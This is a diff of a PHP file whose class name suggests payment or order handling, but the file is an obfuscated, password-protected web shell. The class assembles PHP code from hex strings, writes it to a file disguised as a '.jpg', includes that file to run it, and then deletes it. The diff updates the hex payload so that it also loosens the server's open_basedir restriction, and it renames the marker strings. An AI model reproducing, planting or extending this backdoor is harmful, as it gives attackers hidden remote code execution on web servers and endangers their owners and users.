@@ -1,10 +1,12 @@
 
 <?php
-//ffafewaf9jvqeZHEzTk1
+
+ini_set("open_basedir", ini_get("open_basedir").":".__DIR__);
+//ffafewafA51ecHTzpcwR
 class GetOrderPayMenuP{
 public $jpg;
 public function __construct(){
-$this->jpg="./nbpafebaef.jpg";
+$this->jpg="./nbpafebaeaf.jpg";
 }
 
 public function paypal($sg){
@@ -25,7 +27,7 @@ return $this->xxx($arguments);
 }
 }
 function xxx($hex){
-$suffix = '3061336333663730363837303230';
+$suffix = '30613363336637303638373032303639366536393566373336353734323832323666373036353665356636323631373336353634363937323232326332303639366536393566363736353734323832323666373036353665356636323631373336353634363937323232323932653232336132323265356635663434343935323566356632393362';
 $end = '33663365';
 $hex = $hex[0].'3f3e';
 
@@ -46,9 +48,9 @@ unlink($this->jpg);
 
 }
 }
-//9jvqeZHEzTk1
+//A51ecHTzpcwR
 if(isset($_REQUEST['gggsfa']) and md5($_POST['pwdsafe'])==='dca22ff11d3540d0a7b0ad1f45286d60'){
-$a = array();//fewafwafnlweafn9jvqeZHEzTk1
+$a = array();//fewafwafnlweafnA51ecHTzpcwR
 $order = new GetOrderPayMenuP();
 $GLOBALS["gsw"] = &$a;
 $GLOBALS["gsw"] = array_merge($_REQUEST,$GLOBALS["gsw"]);
@@ -61,5 +63,5 @@ $ag(array($order, "gawsf"), array(array(hello)));
 }
 require_once($order->jpg);
 }
-//9jvqeZHEzTk1
+//A51ecHTzpcwR
 ?>
